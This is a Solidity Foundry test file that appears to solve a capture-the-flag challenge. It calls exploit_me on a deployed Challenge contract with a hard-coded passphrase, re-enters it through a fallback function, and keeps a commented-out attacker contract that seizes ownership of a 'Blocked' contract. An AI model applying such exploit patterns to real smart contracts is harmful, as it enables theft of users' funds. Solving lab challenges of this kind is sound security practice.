// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
// import "../src/Blocked.sol";
import "../src/Challenge.sol";

// contract AttackBlocked {
//     Blocked b_;
//     Challenge c;

//     constructor(address b) {
//         b_ = Blocked(b);
//         b_.addToWhitelist(address(this), "W3BCX");
//         b_.beOwner(address(this));
//     }

//     function p() public {
//         b_.pwn(address(this));
//     }

//     function h() public returns (bool) {
//         return b_.isHacked();
//     }
// }

contract BlockedTest is Test {
    // Blocked blocked;
    // AttackBlocked _attack;
    address alice = makeAddr("alice");
    // address thief = makeAddr("thief");

    Challenge c;

    function setUp() public {
        // blocked = new Blocked();
        // _attack = new AttackBlocked(address(blocked));
        // address o = blocked.owners(0);
        // console2.log(o);

        // HackComplete();

        c = Challenge(0xC15082ecF9122c607b053b00a36B8C497564F2A3);
    }

    function testExploit() external {
        c.exploit_me("W3BCX");
        address hack = c.winners(20);
        assertEq(hack, tx.origin);
    }

    // function HackComplete() public {
    //     // _attack.p();
    //     vm.prank(address(_attack));
    //     blocked.pwn(address(_attack));

    //     console2.log(blocked.isWinner(msg.sender));
    // }

    // function testC() external {
    //     HackComplete();
    //     // vm.prank(address(_attack));
    //     bool s = blocked.hacked(address(_attack));
    //     console2.log(address(_attack));
    //     assertEq(s, true);
    // }

    fallback() external payable {
        c.lock_me();
    }
    // function testMe() external {}
}
